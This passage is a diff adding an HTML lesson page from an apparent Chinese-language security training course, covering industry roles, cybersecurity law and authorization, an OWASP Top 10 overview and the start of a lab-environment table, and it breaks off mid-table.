@@ -1,0 +1,1413 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Stage 03 — 網路安全基礎 | SEC_TRACK</title>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@300;400;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0b0d11;--bg2:#0e1118;--bg3:#141820;--sur:#1c2130;--bdr:#252d3e;--acc:#4f8eff;--txt:#dde3f0;--txt2:#8494b8;--txt3:#4e5d7a;--grn:#3ecf8e;--org:#f97316;--red:#f05252;--ylw:#fbbf24;--pur:#a78bfa;}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:'Noto Sans TC',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 80% 50% at 20% 0%,rgba(79,142,255,.04) 0%,transparent 60%),radial-gradient(ellipse 60% 40% at 80% 100%,rgba(167,139,250,.04) 0%,transparent 60%);pointer-events:none;z-index:0;}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 36px;background:rgba(11,13,17,.95);backdrop-filter:blur(14px);border-bottom:1px solid var(--bdr);}
+.n-logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:.95rem;color:var(--acc);text-decoration:none;}
+.n-logo span{color:var(--txt3);}
+.n-mid{display:flex;align-items:center;gap:10px;}
+.s-pill{font-family:'JetBrains Mono',monospace;font-size:.62rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:3px 10px;border-radius:20px;background:rgba(79,142,255,.15);color:var(--acc);border:1px solid rgba(79,142,255,.25);}
+.n-sname{font-size:.8rem;color:var(--txt2);}
+.n-back{font-size:.8rem;color:var(--txt3);text-decoration:none;transition:color .2s;}
+.n-back:hover{color:var(--acc);}
+.layout{display:grid;grid-template-columns:272px 1fr;min-height:100vh;padding-top:60px;}
+.sidebar{position:sticky;top:60px;height:calc(100vh - 60px);overflow-y:auto;background:var(--bg2);border-right:1px solid var(--bdr);display:flex;flex-direction:column;z-index:10;}
+.sidebar::-webkit-scrollbar{width:3px;}
+.sidebar::-webkit-scrollbar-thumb{background:var(--bdr);}
+.sb-h{padding:24px 22px 18px;border-bottom:1px solid var(--bdr);flex-shrink:0;}
+.sb-tag{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--acc);letter-spacing:.14em;text-transform:uppercase;margin-bottom:7px;}
+.sb-title{font-size:.88rem;font-weight:700;line-height:1.45;margin-bottom:14px;}
+.sb-meta{display:flex;gap:18px;}
+.sm-item{display:flex;flex-direction:column;gap:2px;}
+.sm-val{font-family:'JetBrains Mono',monospace;font-size:.82rem;font-weight:700;color:var(--acc);}
+.sm-key{font-size:.62rem;color:var(--txt3);letter-spacing:.06em;text-transform:uppercase;}
+.sb-nav{flex:1;overflow-y:auto;padding:8px 0;}
+.ch-btn{width:100%;display:flex;align-items:center;gap:9px;padding:10px 22px;background:none;border:none;border-bottom:1px solid rgba(37,45,62,.6);color:var(--txt2);font-family:'Noto Sans TC',sans-serif;font-size:.8rem;font-weight:500;cursor:pointer;text-align:left;transition:color .18s,background .18s;}
+.ch-btn:hover{color:var(--txt);background:var(--bg3);}
+.ch-btn.cact{color:var(--acc);}
+.ch-num{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);min-width:26px;flex-shrink:0;}
+.ch-btn.cact .ch-num{color:var(--acc);}
+.ch-name{flex:1;line-height:1.35;}
+.ch-arr{font-size:.52rem;color:var(--txt3);transition:transform .2s;flex-shrink:0;}
+.ch-btn.copen .ch-arr{transform:rotate(90deg);}
+.ls-list{display:none;flex-direction:column;background:rgba(0,0,0,.12);}
+.ls-list.lopen{display:flex;}
+.ls-btn{display:flex;align-items:flex-start;gap:9px;padding:8px 22px 8px 44px;background:none;border:none;border-bottom:1px solid rgba(37,45,62,.3);color:var(--txt3);font-family:'Noto Sans TC',sans-serif;font-size:.76rem;cursor:pointer;text-align:left;width:100%;transition:color .18s,background .18s;line-height:1.4;}
+.ls-btn:hover{color:var(--txt2);background:rgba(79,142,255,.03);}
+.ls-btn.lact{color:var(--acc);background:rgba(79,142,255,.06);}
+.ls-btn.ldone{color:var(--txt3);}
+.ls-dot{width:5px;height:5px;border-radius:50%;background:var(--bdr);flex-shrink:0;margin-top:5px;transition:background .2s;}
+.ls-btn.lact .ls-dot{background:var(--acc);}
+.ls-btn.ldone .ls-dot{background:var(--grn);}
+.sb-f{padding:14px 22px;border-top:1px solid var(--bdr);flex-shrink:0;}
+.pr{display:flex;justify-content:space-between;font-size:.68rem;color:var(--txt3);margin-bottom:7px;}
+.pt{height:3px;background:var(--bdr);border-radius:2px;overflow:hidden;}
+.pf{height:100%;background:var(--acc);border-radius:2px;transition:width .4s;}
+.main{position:relative;z-index:1;display:flex;flex-direction:column;}
+.lh{padding:40px 56px 32px;border-bottom:1px solid var(--bdr);background:linear-gradient(180deg,rgba(79,142,255,.03) 0%,transparent 100%);}
+.lh-crumb{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--txt3);letter-spacing:.08em;margin-bottom:12px;}
+.lh-crumb em{color:var(--acc);font-style:normal;}
+.lh-title{font-size:1.65rem;font-weight:800;letter-spacing:-.02em;line-height:1.2;margin-bottom:12px;}
+.lh-chips{display:flex;gap:8px;flex-wrap:wrap;}
+.chip{padding:3px 11px;border-radius:20px;font-size:.68rem;font-family:'JetBrains Mono',monospace;letter-spacing:.04em;border:1px solid var(--bdr);color:var(--txt3);}
+.chip.ac{border-color:rgba(79,142,255,.4);color:var(--acc);}
+.cw{padding:40px 56px 80px;max-width:860px;}
+.cb{display:none;}
+.cb.on{display:block;animation:rise .28s ease both;}
+@keyframes rise{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+h2{font-size:1.28rem;font-weight:800;letter-spacing:-.01em;margin:38px 0 14px;color:var(--txt);display:flex;align-items:center;gap:10px;}
+h2::before{content:'';display:inline-block;width:3px;height:1.1em;border-radius:2px;background:var(--acc);flex-shrink:0;}
+h2:first-child{margin-top:0;}
+h3{font-size:1rem;font-weight:700;margin:24px 0 10px;color:var(--txt);}
+p{font-size:.91rem;line-height:1.85;color:var(--txt2);margin-bottom:12px;font-weight:300;}
+strong{color:var(--txt);font-weight:600;}
+code{font-family:'JetBrains Mono',monospace;font-size:.8em;background:var(--sur);border:1px solid var(--bdr);padding:1px 6px;border-radius:3px;color:var(--acc);}
+.note{border-left:3px solid;padding:14px 18px;margin:20px 0;border-radius:0 4px 4px 0;}
+.note-lbl{font-family:'JetBrains Mono',monospace;font-size:.6rem;letter-spacing:.12em;text-transform:uppercase;font-weight:700;margin-bottom:7px;}
+.note p{margin:0;font-size:.87rem;line-height:1.7;}
+.note.tip{border-color:var(--acc);background:rgba(79,142,255,.07);}
+.note.tip .note-lbl{color:var(--acc);}
+.note.warn{border-color:var(--org);background:rgba(249,115,22,.07);}
+.note.warn .note-lbl{color:var(--org);}
+.note.sec{border-color:var(--grn);background:rgba(62,207,142,.07);}
+.note.sec .note-lbl{color:var(--grn);}
+.note.danger{border-color:var(--red);background:rgba(240,82,82,.07);}
+.note.danger .note-lbl{color:var(--red);}
+.note.law{border-color:var(--pur);background:rgba(167,139,250,.07);}
+.note.law .note-lbl{color:var(--pur);}
+.cblock{background:#070a0f;border:1px solid var(--bdr);border-radius:6px;margin:18px 0;overflow:hidden;}
+.ctop{display:flex;align-items:center;justify-content:space-between;padding:8px 16px;background:rgba(28,33,48,.8);border-bottom:1px solid var(--bdr);}
+.clang{font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--txt3);letter-spacing:.1em;text-transform:uppercase;}
+.ccopy{font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--txt3);background:none;border:none;cursor:pointer;transition:color .2s;}
+.ccopy:hover{color:var(--acc);}
+pre{padding:18px 20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:.79rem;line-height:1.75;color:#cdd9f5;}
+pre .kw{color:#c792ea;}pre .fn{color:#82aaff;}pre .st{color:#c3e88d;}pre .cm{color:#4e5d7a;font-style:italic;}
+pre .nu{color:#f78c6c;}pre .tg{color:#f07178;}pre .at{color:#ffcb6b;}pre .vl{color:#c3e88d;}
+pre .sl{color:#89ddff;}pre .vr{color:#eeffff;}pre .op{color:#89ddff;}
+.tbl{overflow-x:auto;margin:18px 0;}
+table.t{width:100%;border-collapse:collapse;font-size:.83rem;}
+table.t th{background:var(--sur);padding:10px 15px;text-align:left;font-size:.65rem;font-family:'JetBrains Mono',monospace;color:var(--txt3);letter-spacing:.08em;text-transform:uppercase;border:1px solid var(--bdr);}
+table.t td{padding:10px 15px;border:1px solid var(--bdr);color:var(--txt2);font-weight:300;vertical-align:top;line-height:1.55;}
+table.t tr:hover td{background:var(--bg3);}
+.mc{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--acc);}
+.kg{display:grid;grid-template-columns:repeat(2,1fr);gap:2px;background:var(--bdr);border:1px solid var(--bdr);margin:18px 0;}
+.kt{background:var(--bg2);padding:15px 18px;}
+.kt-n{font-family:'JetBrains Mono',monospace;font-size:.76rem;color:var(--acc);font-weight:700;margin-bottom:6px;}
+.kt-d{font-size:.79rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.lcards{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;background:var(--bdr);border:1px solid var(--bdr);margin:18px 0;}
+.lcard{background:var(--bg2);padding:18px;}
+.lcard-n{font-size:.82rem;font-weight:700;color:var(--txt);margin-bottom:8px;line-height:1.3;}
+.lcard-t{display:inline-block;font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--pur);border:1px solid rgba(167,139,250,.3);padding:2px 8px;border-radius:2px;margin-bottom:10px;letter-spacing:.06em;}
+.lcard-b{font-size:.78rem;color:var(--txt2);line-height:1.65;font-weight:300;}
+.quiz{background:var(--bg3);border:1px solid var(--bdr);border-radius:6px;padding:24px;margin:28px 0;}
+.q-lbl{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--ylw);letter-spacing:.12em;text-transform:uppercase;margin-bottom:11px;}
+.q-q{font-size:.91rem;font-weight:600;margin-bottom:14px;line-height:1.5;color:var(--txt);}
+.q-opts{display:flex;flex-direction:column;gap:7px;}
+.qo{display:flex;align-items:flex-start;gap:11px;padding:9px 14px;border:1px solid var(--bdr);border-radius:4px;cursor:pointer;font-size:.84rem;color:var(--txt2);transition:all .18s;line-height:1.5;}
+.qo:hover{border-color:var(--acc);color:var(--txt);}
+.qo.ok{border-color:var(--grn);background:rgba(62,207,142,.07);color:var(--grn);}
+.qo.bad{border-color:var(--red);background:rgba(240,82,82,.07);color:var(--red);}
+.qo-k{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--txt3);min-width:17px;padding-top:1px;flex-shrink:0;}
+.q-exp{display:none;margin-top:13px;padding:12px 15px;background:rgba(79,142,255,.06);border-left:2px solid var(--acc);border-radius:0 4px 4px 0;font-size:.83rem;color:var(--txt2);line-height:1.65;}
+.q-exp.on{display:block;}
+.ilist{display:flex;flex-direction:column;border:1px solid var(--bdr);border-radius:4px;overflow:hidden;margin:18px 0;}
+.il-item{display:flex;align-items:flex-start;gap:14px;padding:13px 18px;border-bottom:1px solid var(--bdr);transition:background .15s;}
+.il-item:last-child{border-bottom:none;}
+.il-item:hover{background:var(--bg3);}
+.il-num{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--acc);min-width:24px;flex-shrink:0;padding-top:2px;font-weight:700;}
+.il-txt{font-size:.86rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.il-txt strong{color:var(--txt);}
+.lnav{display:flex;justify-content:space-between;align-items:center;padding:24px 56px;border-top:1px solid var(--bdr);background:var(--bg2);position:sticky;bottom:0;z-index:5;}
+.lb{display:flex;align-items:center;gap:7px;padding:9px 20px;border:1px solid var(--bdr);border-radius:4px;background:none;color:var(--txt2);font-size:.83rem;cursor:pointer;font-family:'Noto Sans TC',sans-serif;transition:all .18s;}
+.lb:hover:not(:disabled){border-color:var(--acc);color:var(--acc);}
+.lb.pr{background:var(--acc);color:var(--bg);border-color:var(--acc);font-weight:700;}
+.lb.pr:hover:not(:disabled){background:#6fa3ff;}
+.lb:disabled{opacity:.22;cursor:not-allowed;}
+.ln-mid{text-align:center;}
+.ln-cnt{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--txt3);}
+.ln-sub{font-size:.76rem;color:var(--txt3);margin-top:3px;max-width:260px;}
+.done-banner{background:linear-gradient(135deg,rgba(79,142,255,.1),rgba(123,94,167,.08));border:1px solid rgba(79,142,255,.25);border-radius:6px;padding:30px;margin:36px 0 16px;text-align:center;}
+.done-banner h3{font-size:1.15rem;font-weight:800;color:var(--acc);margin-bottom:8px;}
+.done-banner p{font-size:.88rem;margin-bottom:22px;}
+.btn-row{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;}
+.btn-p{display:inline-block;padding:11px 26px;background:var(--acc);color:var(--bg);text-decoration:none;font-weight:700;font-size:.86rem;border-radius:4px;transition:all .2s;}
+.btn-p:hover{background:#6fa3ff;transform:translateY(-1px);}
+.btn-g{display:inline-block;padding:11px 26px;border:1px solid var(--bdr);color:var(--txt2);text-decoration:none;font-size:.86rem;border-radius:4px;transition:all .2s;}
+.btn-g:hover{border-color:var(--acc);color:var(--acc);}
+@media(max-width:900px){.layout{grid-template-columns:1fr;}.sidebar{position:static;height:auto;}.lh,.cw{padding-left:22px;padding-right:22px;}.lnav{padding:18px 22px;}.kg,.lcards{grid-template-columns:1fr;}.ln-sub{display:none;}}
+</style>
+</head>
+<body>
+<nav>
+  <a href="index.html" class="n-logo">SEC<span>_</span>TRACK</a>
+  <div class="n-mid"><span class="s-pill">STAGE 03</span><span class="n-sname">網路安全基礎與提升</span></div>
+  <a href="index.html" class="n-back">&#8592; 首頁</a>
+</nav>
+
+<div class="layout">
+<aside class="sidebar">
+  <div class="sb-h">
+    <div class="sb-tag">STAGE 03 · 1週</div>
+    <div class="sb-title">網路安全基礎<br>進階核心知識</div>
+    <div class="sb-meta">
+      <div class="sm-item"><span class="sm-val">4</span><span class="sm-key">章節</span></div>
+      <div class="sm-item"><span class="sm-val">23</span><span class="sm-key">課程</span></div>
+      <div class="sm-item"><span class="sm-val">1週</span><span class="sm-key">時長</span></div>
+    </div>
+  </div>
+  <div class="sb-nav">
+    <div>
+      <button class="ch-btn copen cact" onclick="toggleCh(this,'ch1')">
+        <span class="ch-num">CH1</span><span class="ch-name">網路安全基礎入門</span><span class="ch-arr">&#9658;</span>
+      </button>
+      <div class="ls-list lopen" id="ch1">
+        <button class="ls-btn lact" onclick="go('l1-1',this)"><span class="ls-dot"></span>資安行業概況與就業方向</button>
+        <button class="ls-btn" onclick="go('l1-2',this)"><span class="ls-dot"></span>網路安全法律法規</button>
+        <button class="ls-btn" onclick="go('l1-3',this)"><span class="ls-dot"></span>常見漏洞與風險概覽（OWASP）</button>
+        <button class="ls-btn" onclick="go('l1-4',this)"><span class="ls-dot"></span>攻防實驗環境搭建</button>
+        <button class="ls-btn" onclick="go('l1-5',this)"><span class="ls-dot"></span>滲透測試專業術語速查</button>
+        <button class="ls-btn" onclick="go('l1-6',this)"><span class="ls-dot"></span>CTF、護網行動與漏洞庫</button>
+      </div>
+    </div>
+    <div>
+      <button class="ch-btn" onclick="toggleCh(this,'ch2')">
+        <span class="ch-num">CH2</span><span class="ch-name">HTML / JavaScript 入門</span><span class="ch-arr">&#9658;</span>
+      </button>
+      <div class="ls-list" id="ch2">
+        <button class="ls-btn" onclick="go('l2-1',this)"><span class="ls-dot"></span>為什麼資安工程師要學 HTML？</button>
+        <button class="ls-btn" onclick="go('l2-2',this)"><span class="ls-dot"></span>HTML 標籤、元素與表單</button>
+        <button class="ls-btn" onclick="go('l2-3',this)"><span class="ls-dot"></span>JavaScript 基礎語法</button>
+        <button class="ls-btn" onclick="go('l2-4',this)"><span class="ls-dot"></span>流程控制與事件處理</button>
+      </div>
+    </div>
+    <div>
+      <button class="ch-btn" onclick="toggleCh(this,'ch3')">
+        <span class="ch-num">CH3</span><span class="ch-name">PHP 入門學習</span><span class="ch-arr">&#9658;</span>
+      </button>
+      <div class="ls-list" id="ch3">
+        <button class="ls-btn" onclick="go('l3-1',this)"><span class="ls-dot"></span>PHP 環境搭建與基本語法</button>
+        <button class="ls-btn" onclick="go('l3-2',this)"><span class="ls-dot"></span>流程控制與函數</button>
+        <button class="ls-btn" onclick="go('l3-3',this)"><span class="ls-dot"></span>陣列、正則、文件操作</button>
+        <button class="ls-btn" onclick="go('l3-4',this)"><span class="ls-dot"></span>文件上傳、會話管理、錯誤處理</button>
+        <button class="ls-btn" onclick="go('l3-5',this)"><span class="ls-dot"></span>PHP 操作 MySQL 資料庫</button>
+        <button class="ls-btn" onclick="go('l3-6',this)"><span class="ls-dot"></span>危險函數與安全開發規範</button>
+      </div>
+    </div>
+    <div>
+      <button class="ch-btn" onclick="toggleCh(this,'ch4')">
+        <span class="ch-num">CH4</span><span class="ch-name">MySQL / MSSQL 資料庫</span><span class="ch-arr">&#9658;</span>
+      </button>
+      <div class="ls-list" id="ch4">
+        <button class="ls-btn" onclick="go('l4-1',this)"><span class="ls-dot"></span>資料庫介紹與安裝</button>
+        <button class="ls-btn" onclick="go('l4-2',this)"><span class="ls-dot"></span>資料庫與資料表操作</button>
+        <button class="ls-btn" onclick="go('l4-3',this)"><span class="ls-dot"></span>CRUD 操作與 SELECT 查詢</button>
+        <button class="ls-btn" onclick="go('l4-4',this)"><span class="ls-dot"></span>字元集、索引與帳號權限</button>
+        <button class="ls-btn" onclick="go('l4-5',this)"><span class="ls-dot"></span>資安視角：SQL 注入前置知識</button>
+        <button class="ls-btn" onclick="go('l4-6',this)"><span class="ls-dot"></span>MSSQL 基礎與差異比較</button>
+        <button class="ls-btn" onclick="go('l4-7',this)"><span class="ls-dot"></span>MySQL 常用函數速查</button>
+      </div>
+    </div>
+  </div>
+  <div class="sb-f">
+    <div class="pr"><span>學習進度</span><span id="pct">0%</span></div>
+    <div class="pt"><div class="pf" id="pf" style="width:0%"></div></div>
+  </div>
+</aside>
+
+<main class="main">
+  <div class="lh">
+    <div class="lh-crumb" id="crumb">STAGE 03 &gt; CH1 &gt; <em>課程 1</em></div>
+    <h1 class="lh-title" id="ltitle">資安行業概況與就業方向</h1>
+    <div class="lh-chips">
+      <span class="chip ac" id="chip1">行業入門</span>
+      <span class="chip" id="chip2">15 分鐘</span>
+    </div>
+  </div>
+
+  <div class="cw">
+
+<!-- ===== L1-1 ===== -->
+<div class="cb on" id="l1-1">
+<h2>資安行業現況</h2>
+<p>根據 2024 年統計，全球網路安全人才缺口已超過 <strong>350 萬人</strong>，且持續增長。在中國，隨著《網路安全法》《數據安全法》《個人信息保護法》陸續實施，以及「等保 2.0」全面落地，企業對資安合規的需求呈爆發式增長。資安不再是可有可無的選項，而是企業的法律義務。</p>
+
+<h3>資安工程師的主要方向</h3>
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>滲透測試工程師</strong> — 模擬攻擊者對系統進行授權的安全測試，找出漏洞並出具報告。需要最廣泛的技術知識，對應本課程的核心 Stage 4。</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>安全運營工程師（SOC）</strong> — 負責監控安全事件、分析告警、應急響應。使用 SIEM 工具（ELK/Splunk）進行日誌分析，對應 Stage 9。</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>等保/合規工程師</strong> — 協助企業完成等級保護測評、ISO27001 認證等合規工作，需求量大，對應 Stage 10-14。</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>安全開發工程師</strong> — 開發安全工具、WAF、掃描器等，需要紮實的程式能力（Python/Go），對應 Stage 15。</div></div>
+  <div class="il-item"><span class="il-num">05</span><div class="il-txt"><strong>移動安全工程師</strong> — 對 Android/iOS 應用進行安全分析，屬於稀缺方向，對應 Stage 5-6。</div></div>
+  <div class="il-item"><span class="il-num">06</span><div class="il-txt"><strong>雲安全工程師</strong> — 新興方向，負責雲原生環境（K8S、容器）的安全評估，對應 Stage 8。</div></div>
+</div>
+
+<div class="note tip">
+  <div class="note-lbl">學習路線建議</div>
+  <p>正確策略：<strong>先夯實基礎（Stage 1-3）→ 深入 Web 滲透核心（Stage 4，最重要，佔 2 個月）→ 根據興趣選擇專項方向（Stage 5-15）</strong>。不要跳過基礎直接學工具，知其然不知其所以然，遇到新場景就會束手無策。</p>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">如果你的目標是成為一名 Web 滲透測試工程師，按照本課程的設計，最核心、最應該深入學習的是哪個 Stage？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>Stage 1（網路基礎），因為網路是一切的基礎</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span>Stage 4（Web 滲透測試），是時間最長、內容最豐富的核心 Stage</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span>Stage 15（Python 開發），能寫程式才能做安全</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>哪個 Stage 都一樣重要，沒有特別核心的</div>
+  </div>
+  <div class="q-exp">正確！Stage 4「Web 滲透測試」是整個課程最核心的階段，涵蓋 32 個章節、需要 2 個月學習，包含 SQL 注入、XSS、文件上傳、MSF 使用、WAF 繞過、源碼審計等全套 Web 滲透技術。Stage 1-3 是前置基礎，Stage 5+ 是基於 Stage 4 的專項延伸。</div>
+</div>
+</div>
+
+<!-- ===== L1-2 法律法規 ===== -->
+<div class="cb" id="l1-2">
+<h2>網路安全法律法規</h2>
+<p>在開始學習任何攻擊技術之前，必須先了解相關法律法規。<strong>未經授權的滲透測試是違法行為</strong>，即使初衷是「幫助對方找漏洞」，沒有書面授權依然可能面臨刑事責任。</p>
+
+<div class="note danger">
+  <div class="note-lbl">法律紅線</div>
+  <p>《刑法》第 285 條（非法侵入計算機信息系統罪）和第 286 條（破壞計算機信息系統罪）明確規定，未經授權侵入他人計算機系統，最高可判處 <strong>7 年有期徒刑</strong>。永遠只在授權範圍內進行測試，永遠先取得書面授權協議（SOW）。</p>
+</div>
+
+<h3>三大核心法律</h3>
+<div class="lcards">
+  <div class="lcard">
+    <div class="lcard-n">《網路安全法》</div>
+    <div class="lcard-t">2017年6月施行</div>
+    <div class="lcard-b">確立網路安全基本制度框架，包括等級保護、關鍵信息基礎設施保護、個人信息保護等。規定網絡運營者的安全義務。</div>
+  </div>
+  <div class="lcard">
+    <div class="lcard-n">《數據安全法》</div>
+    <div class="lcard-t">2021年9月施行</div>
+    <div class="lcard-b">建立數據分類分級保護制度。違規最高罰款 200 萬元，情節嚴重可罰 1000 萬元並吊銷執照。</div>
+  </div>
+  <div class="lcard">
+    <div class="lcard-n">《個人信息保護法》</div>
+    <div class="lcard-t">2021年11月施行</div>
+    <div class="lcard-b">中國版「GDPR」，規範個人信息的收集、處理、存儲、使用。違規最高罰款為上一年度營業額的 5%。</div>
+  </div>
+</div>
+
+<h3>合法滲透的四個前提</h3>
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>書面授權協議（SOW）</strong> — 明確測試範圍、時間、方法，由甲方授權負責人簽名蓋章。沒有這份文件，任何測試都是非法的。</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>範圍限定</strong> — 測試只能在授權的 IP 範圍、域名、系統內進行，絕對不能橫向擴展到授權範圍之外。</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>不破壞原則</strong> — 即使是授權的測試，也不應造成業務中斷、數據損壞或洩露。生產環境需格外謹慎。</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>負責任的漏洞披露</strong> — 發現的漏洞只能報告給委託方，不得公開或利用。可透過 CNVD/CVE 進行規範披露。</div></div>
+</div>
+
+<div class="note law">
+  <div class="note-lbl">SRC 平台：合法練習真實漏洞的最佳途徑</div>
+  <p>各大廠商（騰訊、阿里、百度、字節等）均設有 SRC（安全應急響應中心），允許安全研究者在規定範圍內提交漏洞，給予現金或積分獎勵。這是初學者合法練習真實漏洞挖掘並建立個人資安履歷的最佳方式。</p>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">你發現了某電商平台存在 SQL 注入漏洞。以下哪個做法是合法且負責任的？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>利用漏洞導出部分用戶數據，截圖後向網站索要賞金</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">B</span>在社群媒體公開發布漏洞細節，讓更多人知道</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">C</span>不實際利用漏洞，透過 SRC 平台或郵件向企業安全團隊負責任地披露</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>保留漏洞，等以後有需要時再使用</div>
+  </div>
+  <div class="q-exp">正確！這是「負責任的漏洞披露（Responsible Disclosure）」。正確做法：不實際利用漏洞竊取數據（犯罪），通過正規渠道通知企業，給予合理修復時間（通常 90 天）。選項 A 是敲詐勒索，B 可能導致漏洞被惡意利用，D 留作後用同樣違法。</div>
+</div>
+</div>
+
+<!-- ===== L1-3 OWASP ===== -->
+<div class="cb" id="l1-3">
+<h2>常見漏洞與風險概覽（OWASP Top 10）</h2>
+<p>OWASP（Open Web Application Security Project）每隔幾年發布 Web 應用十大安全風險排行榜，是業界公認的 Web 安全參考標準。Stage 4 的 Web 滲透測試課程將逐一深入學習，本節先建立整體認識。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>#</th><th>漏洞名稱</th><th>簡要說明</th><th>Stage 4 章節</th></tr></thead>
+    <tbody>
+      <tr><td class="mc">A01</td><td><strong>存取控制失效</strong></td><td>用戶能訪問不應有權限的資源（越權漏洞、IDOR）</td><td>第17章</td></tr>
+      <tr><td class="mc">A02</td><td><strong>加密機制失效</strong></td><td>敏感資料傳輸或存儲時未加密或使用弱加密算法</td><td>第19章</td></tr>
+      <tr><td class="mc">A03</td><td><strong>注入</strong></td><td>SQL/命令/LDAP 注入，惡意資料被當作命令執行</td><td>第7-9章</td></tr>
+      <tr><td class="mc">A04</td><td><strong>不安全設計</strong></td><td>架構和設計層面缺乏安全考量，如業務邏輯漏洞</td><td>第25章</td></tr>
+      <tr><td class="mc">A05</td><td><strong>安全配置錯誤</strong></td><td>默認密碼、開放不必要端口、詳細錯誤訊息洩露</td><td>第23章</td></tr>
+      <tr><td class="mc">A06</td><td><strong>過時易受攻擊元件</strong></td><td>使用含已知漏洞的第三方庫（如 Log4j、Shiro）</td><td>第14章</td></tr>
+      <tr><td class="mc">A07</td><td><strong>身份認證失效</strong></td><td>弱密碼、憑證洩露、Session 管理不當</td><td>第19-20章</td></tr>
+      <tr><td class="mc">A08</td><td><strong>軟體及資料完整性失效</strong></td><td>不安全的反序列化、CI/CD 管道未驗證</td><td>第14章</td></tr>
+      <tr><td class="mc">A09</td><td><strong>安全記錄及監控失效</strong></td><td>未記錄安全事件，無法及時發現和響應入侵</td><td>Stage 9</td></tr>
+      <tr><td class="mc">A10</td><td><strong>SSRF 伺服器請求偽造</strong></td><td>讓伺服器訪問內網資源，可突破邊界防禦</td><td>第12章</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<h3>其他重要漏洞類型</h3>
+<div class="kg">
+  <div class="kt"><div class="kt-n">XSS（跨站腳本攻擊）</div><div class="kt-d">攻擊者在網頁中注入惡意 JavaScript，在受害者瀏覽器中執行，可竊取 Cookie、釣魚等。分反射型、存儲型、DOM 型。</div></div>
+  <div class="kt"><div class="kt-n">CSRF（跨站請求偽造）</div><div class="kt-d">利用受害者已登入的身份，在不知情情況下發送惡意請求。常用於轉帳、修改密碼等操作。</div></div>
+  <div class="kt"><div class="kt-n">文件上傳漏洞</div><div class="kt-d">伺服器未正確驗證上傳文件類型，攻擊者上傳 PHP Webshell 獲取伺服器控制權。是最直接的 GetShell 方法之一。</div></div>
+  <div class="kt"><div class="kt-n">反序列化漏洞</div><div class="kt-d">應用程式在還原序列化數據時未驗證來源，攻擊者構造惡意數據實現 RCE（遠端代碼執行）。Log4j 屬此類。</div></div>
+</div>
+</div>
+
+<!-- ===== L1-4 環境搭建 ===== -->
+<div class="cb" id="l1-4">
+<h2>攻防實驗環境搭建</h2>
+<p>在學習任何攻防技術之前，需要先搭建安全的實驗環境。<strong>切勿在真實公網環境或未獲授權的系統上練習任何攻擊技術。</strong></p>
+
+<h3>推薦實驗架構</h3>
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>角色</th><th>系統</th><th>網路模式</th><th>用途</th></tr></thead>
+    <tbody>
+      <tr><td><strong>攻擊機</strong></td><td>Kali Linux 2025</td><td>NAT 或橋接</td><td>運行滲透工具（Burp Suite、Nmap、MSF）</td></tr>
+      <tr><td><strong>Web 靶機</strong></td><td>Vulhub / DVWA (Docker)</td><td>僅主機模式</td><td>各種 Web 漏洞的練習環境</td></tr>
+      <tr><td><strong>系統靶機</strong></td><td>Metasploitable 2/3</td><td>僅主機模式</td><td>系統漏洞練習（SMB、SSH、FTP 等）</td></tr>
+      <tr><td><strong>Windows 靶機</strong></td><td>Windows 7 / Server 2008</td><td>僅主機模式</td><td>Windows 滲透和提權練習</td></tr>
+    </tbody>
+  </table>
